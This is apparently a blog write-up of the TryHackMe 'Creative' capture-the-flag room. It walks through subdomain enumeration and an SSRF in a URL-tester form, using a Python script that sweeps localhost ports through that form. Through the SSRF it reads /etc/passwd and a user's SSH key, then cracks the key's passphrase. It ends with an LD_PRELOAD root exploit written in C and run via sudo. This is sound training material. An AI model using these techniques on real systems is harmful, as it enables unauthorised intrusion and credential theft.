# Creative

***
![Creative](https://tryhackme-images.s3.amazonaws.com/room-icons/bab044b44df50036b61681f0778fced2.svg)

### Difficulty: Easy

***

## Nmap Scan

Running nmap scan on the machine, we have

```bash
┌──(sixth-sensei㉿senseisec)-[~/THM/Creative]
└─$ sudo nmap -sS -sC -sV 10.10.47.147
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-08 04:13 WAT
Nmap scan report for creative.thm (10.10.47.147)
Host is up (0.30s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.41 seconds

```
we have 2 open ports `ssh` and `http`; From the result above also, we notice a domain name associated with the IP `creative.thm`.

## Enumeration

### Port 80

Navigating to the web service using either the IP or domain name `creative.thm`, we're greeted with this page

![http_service](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/d8749b63-fb91-497d-ae8c-79749efc2e53)

From webpage, we noticed it is a static site and couldn't get any information as well from the source code. Let's check for hidden directories, if we'll find any

_NB:_ I had to add `creative.thm` as an entry to our hosts file to run the gobuster scan

![hosts](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/52f18206-5137-44a5-8af3-70ce640e27c3)

![gobuster_dir](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/3c9faad9-f982-4866-97b0-d2abce7ea1f9)

The only endpoint found is `/assets` which does return a 403 error code and doesn't prove too useful. Since there's an associated domain name, we could enumerate for sub-domains as well using gobuster's `vhost` mode.

![gobuster_vhost](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/11ac97e2-9daa-4d16-a2d9-66d86d78376e)

Found a `beta.creative.thm` subdomain almost immediately, finally a lead 😃

- _NB:_ If you don't already have, install seclists using `sudo apt install seclists` to have access to the extensive wordlists used.

_a little explanation_

- Virtual host enumeration involves finding all virtual hosts associated with an IP address or domain.

Navigating to the sub-domain found (but before that, we need to also add it to our hosts file as we did earlier), we have this

![beta](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/c9ac0cb1-ee6f-437c-8015-d9a75c5acab5)

A URL tester? 🤔

Couldn't figure out how best to use this, so i decided to host a php reverse shell with python server and see if it'll parse the URL and give RCE

![local_server](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/ddc823bb-aff7-4622-b772-24100d271e06)

![url](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/7a02af01-b633-48db-b28a-87445343f7b6)

It didn't give RCE rather just showed the file contents in plain text

![phpshell](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/24019c85-40c2-423e-b51b-c91c492864ad)

![confused](https://media1.tenor.com/m/O2ZgbQ--_XUAAAAC/spongebob-squarepants-spongebob.gif)

After much back and forth, tried to access `http://localhost` from the URL tester and got the basic HTML version of the creative.thm website

![html](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/688b8c83-10aa-43e1-a859-9a1318eb4d33)

Tried accessing it again but this time using a port `http://localhost:80` and it gave the same result. I got the idea of looping through the ports from 1 - 65535 to see if there's any exposed file system.

Only way to do this with speed is using burp intruder, starting with the first 1000 ports as payload

![1-1000](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/476d255f-7ae7-4821-9939-4482f46a969d)

The first 1000 ports didn't return any leads except for port 80 which we've seen earlier. 

The process was very slow with the burp community version, so i searched for alternatives and found this python script that can be used to loop through the 65000 ports in a blink

```python
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

def send_post_request(url, payload, headers):
    try:
        response = requests.post(url, data=payload, headers=headers)
        content_length = response.headers.get('Content-Length')
        if content_length != '13':  # Check if content length isn't 13
            print(f"POST request to {url} with payload {payload} returned status code: {response.status_code}, content length: {content_length}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending POST request: {e}")

def main():
    base_url = "http://beta.creative.thm"
    headers = {
        "Host": "beta.creative.thm",
        "Content-Length": "38",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "http://beta.creative.thm",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Sec-GPC": "1",
        "Accept-Language": "en-GB,en;q=0.9",
        "Referer": "http://beta.creative.thm/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }

    # Using ThreadPoolExecutor to run 20 threads concurrently
    with ThreadPoolExecutor(max_workers=20) as executor:
        for port_number in range(1000, 65536):
            url = f"http://localhost:{port_number}"
            payload = f"url=http%3A%2F%2Flocalhost%3A{port_number}"
            executor.submit(send_post_request, base_url, payload, headers)

if __name__ == "__main__":
    main()
```
_Explanation_

- The reason why it checked for a request that doesn't return a content length of 13 is that a non existent port/request returns 13 as its content length as seen in the captured request below

![request](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/22436f45-dfe0-4ee2-84b5-9f6260379e69)

- The headers used we're also from the captured request in burp, so modify it to your own header

_NB:_ I also didn't start from port 1 rather 1000 since i already ran through those in burpsuite but you might want to start from 1

Running the python script

![script](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/e74a7e64-7db6-48d6-b135-e6313131c840)

We can see port 1337 didn't return a content length of 13, navigating to `http://localhost:1337`

![1337](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/9276a713-b2d1-4b29-a274-4383984bf88b)

Voila! we get a file system served on this port; now we can start tweaking our requests to the URL tester and see what we can get. Starting with `http://localhost:1337/etc/passwd`

![passwd](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/c5f3b219-725e-4ecf-a25a-c460dd078eef)

We can see a standard user `saad` in the passwd file, tried accessing the home directory

![home](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/03fd6bc9-fb12-4fc1-9ef1-ccf146d152c7)

Poaching further into `saad` directory and we can see the user flag `user.txt` without having initial access yet

![saad](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/4a101e6e-3070-4515-a955-4369ee545a2c)

From the listing, we can also see a `start_server.py` script, viewing the file and it shows that its the script used to serve the file system on port `1337`

![start_server](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/b92b85ed-dfb7-4eb6-bd7e-9fc0423ec4bd)

While pivoting the file system, found ssh keys for user `saad`

![saad_ssh](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/b9762a2e-aa8c-4124-8c52-b649250bdf70)

let's copy the `id_rsa` file and use it to authenticate as user `saad`

NB: copy from the page source to get the right format of the key and avoid errors

![id_rsa](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/aacc12ba-539a-474a-82d2-0bde18b973f6)

## Initial Access
Set the permission for the key to user read & write only `chmod 600` so we can use it to authenticate.

I like exhaustive sweeping, so I somehow went back to saad's home folder and checked the `.bash_history` file

![bash_history](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/66c0e818-583d-45d3-ab12-1202f0ab6579)

Voila! there lies his password; but i couldn't use it to authenticate, so let's stick to the rsa file

![rsa_protected](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/378bfda8-38b0-455a-9e25-5a9cd1c586a1)

Found the id_rsa key to have a passphrase, so we'll have to create a john compatible hash with `ssh2john` and crack it

```bash
┌──(sixth-sensei㉿senseisec)-[~/THM/Creative]
└─$ ssh2john id_rsa > idrsa_john.txt
```

![rsa-crack](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/e68f5444-7865-4e9d-9025-a87392e29778)

Now that we got the rsa file passphrase, let's authenticate again as saad

![user-shell](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/7e7741cc-7b81-4682-821a-d06de51a4200)

## Privilege Escalation

Checking saad's privilege on the machine, we have

![sudo-l](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/10caba94-7398-4c80-ab6a-9bf1c90c73ed)

We can notice `LD_PRELOAD` is present in `env_keep`, let's craft our exploit by creating a simple c script

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
Save and compile the script as a shared object `.so` using `gcc -fPIC -shared [exploitname].c -o [exploitname].so -nostartfiles`

![shell_code](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/ba21571b-d196-4738-b8aa-0b9ad239d575)

Now we can simply set a new path for `LD_PRELOAD` and run this script as a command the user has sudo privileges on, which in this case is `ping`

![root-shell](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/c612cd9d-c9e5-420d-9bd8-b4051c8c9d5e)

....and we're root! Listing the directory

![rootflag](https://github.com/sixth-sensei/sixth-sensei.github.io/assets/31647166/b528915e-00de-4cf0-b549-edefec715f34)

We can see our root flag, that marks the end h4x0r 🚀

![salute](https://media1.tenor.com/m/tVy1iyr9AMQAAAAC/mr-bean-thumbs-up.gif)

<br>

**See you again 👋🏽**


<button onclick="window.location.href='https://sixth-sensei.github.io';">Back To Home 🏠</button>

